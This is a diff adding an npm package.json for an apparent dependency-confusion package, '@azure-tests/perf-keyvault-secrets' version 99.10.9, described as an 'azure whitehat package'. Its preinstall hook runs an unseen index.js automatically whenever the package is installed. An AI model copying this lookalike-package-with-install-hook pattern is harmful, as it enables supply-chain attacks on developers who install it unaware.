@@ -1,0 +1,39 @@
+{
+    "name": "@azure-tests/perf-keyvault-secrets",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "@azure-tests/perf-keyvault-secrets@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-+NmxyhaEjZG6ym2YWVI/IEqmruXASN8cn7/Ki6NtqFn+EqCmbW0MqC0YbZ246ecpG/AIRPyVf9Rfl4VxOlSUXQ==",
+        "shasum": "bb381fbc2a354226365bba8617a30782eca5ee2f",
+        "tarball": "https://registry.npmjs.org/@azure-tests/perf-keyvault-secrets/-/perf-keyvault-secrets-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3598,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoRT8CRA9TVsSAnZWagAAqdMP/jnIXjJl2PBf/cYPlfo8\nVBqeqR3JGelY7q+31+pgLXw3JI/mLUIE480jt6dHsefC/UHJG4Une9nkYreK\nfzpeTohEwpBc+ArUfz5Fm3bJoOwpXddqq0lhRwUHC8MDGevrWIUGyL3ZNRuP\n7WmHrMaxhiyOdSrp5O1hXMWWKXrD5S+qbPKeMzh6vEiPhyhKyfVBTfZZ7q0T\nb6sPYm+l2G6R/LIOcKblj2ct1cQTH9eqD9t02QoafcCQdX2lSqmhJqP4lpUz\nLCUY3Yj2j4xAwEYY5r6hRZhmfi5MxzSLxfQzZINgburwqO/8lqrF53E8d8//\nXfeVvqxOIqyw0fjMfw7bitKR6d1yfVIdNoa0LHplvBlTV80dO0PfqjUu1RbL\nO5f+XS7AS1DTDaXx9ZSTeVv3htEaXn+OLbOddv5M0vzQ22PxjOErHJOtII1M\niHOMRGNhp3P+svp9JZl9QUm+QNhZ3jTEJW9KgkOVsp8VYibAQrGVUi5Q2Ya5\ni50KADzx0gtHK7FqnECRGVTVbFGC701g+GmxSt0WvwZ4J4w4443bV84Z6J69\nOii7RrAktD5VrRKcYGJocNHmiCnnaN2naiJ0djp+AZLZZXi07FHLqoPVh6yy\nGsyCdD391HkFi/Z0lqO2TXnDR8uZvpLZW7nAogAuHUC82Mx1htB5gMJut0xS\n1vIY\r\n=R8CV\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-keyvault-secrets_99.10.9_1637946620499_0.46736323773927513"
+    },
+    "_hasShrinkwrap": false
+}
